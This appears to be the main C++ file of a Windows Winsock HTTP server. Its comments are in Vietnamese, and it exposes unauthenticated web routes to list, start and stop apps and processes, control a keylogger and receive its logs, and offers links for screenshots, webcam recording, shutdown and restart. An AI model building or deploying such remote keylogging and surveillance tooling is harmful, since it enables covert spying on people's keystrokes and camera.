#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include "config.h"
#include "http_utils.h"
#include "router.h"
#include "apps.h"
#include "processes.h"
#include "keylogger.h"

int main() {
    // 1. Khởi tạo Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed.\n";
        return 1;
    }

    // 2. Tạo socket
    SOCKET server_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (server_fd == INVALID_SOCKET) {
        std::cerr << "socket failed with error: " << WSAGetLastError() << "\n";
        WSACleanup();
        return 1;
    }

    // 3. Bind (gán địa chỉ)
    sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(server_fd, (sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed with error: " << WSAGetLastError() << "\n";
        closesocket(server_fd);
        WSACleanup();
        return 1;
    }

    // 4. Listen
    if (listen(server_fd, 5) == SOCKET_ERROR) {
        std::cerr << "Listen failed with error: " << WSAGetLastError() << "\n";
        closesocket(server_fd);
        WSACleanup();
        return 1;
    }

    std::cout << "Server running at http://localhost:" << PORT << "\n";
    
    // 5. Vòng lặp Accept và Xử lý
    while (true) {
        SOCKET client_socket = accept(server_fd, NULL, NULL);
        if (client_socket == INVALID_SOCKET) {
            std::cerr << "Accept failed with error: " << WSAGetLastError() << "\n";
            continue;
        }

        char buffer[BUFFER_SIZE];
        int bytes_received = recv(client_socket, buffer, BUFFER_SIZE - 1, 0);

        if (bytes_received > 0) {
            buffer[bytes_received] = '\0';
            std::string request(buffer);
            std::cout << request << "\n";

            std::string route;
            std::map<std::string, std::string> query = parse_request_path(request, route);
            std::string response;

            if (route == "/") {
                response = html_page("<h1>WinSock C++ App Controller</h1>"
                                     "<ul>"
                                     "<li><a href='/apps'>List apps</a></li>"
                                     "<li><a href='/processes'>List processes</a></li>"
                                     "<li><a href='/processes/actions'>Start/Stop processes</a></li>"
                                     "<li><a href='/keylogger'>Keylogger</a></li>"
                                     "<li><a href='/screenshoot'>Screenshoot</a></li>"
                                     "<li><a href='/webcam_rec'>Record webcam 10s</a></li>"
                                     "<li><a href='/shutdown'>Shutdown</a> (admin)</li>"
                                     "<li><a href='/restart'>Restart</a> (admin)</li>"
                                     "</ul>");
            } else if (route == "/apps") {
                response = list_apps();
            } else if (route == "/apps/start") {
                std::string app_name = query.count("app") ? query["app"] : "";
                start_app(app_name);
                response = redirect("/apps");
            } else if (route == "/apps/stop") {
                std::string app_name = query.count("app") ? query["app"] : "";
                stop_app(app_name);
                response = redirect("/apps");
            } else if (route == "/processes") {
                response = list_processes();
            } else if (route == "/keylogger") {
                response = keylog_control();
            } else if (route == "/keylogger/send") {
                response = keylog_receive(query);
            } else {
                response = html_page("<h1>404 Not Found</h1>");
            }

            send(client_socket, response.c_str(), response.length(), 0);
        }

        closesocket(client_socket);
    }

    closesocket(server_fd);
    WSACleanup();
    return 0;
}
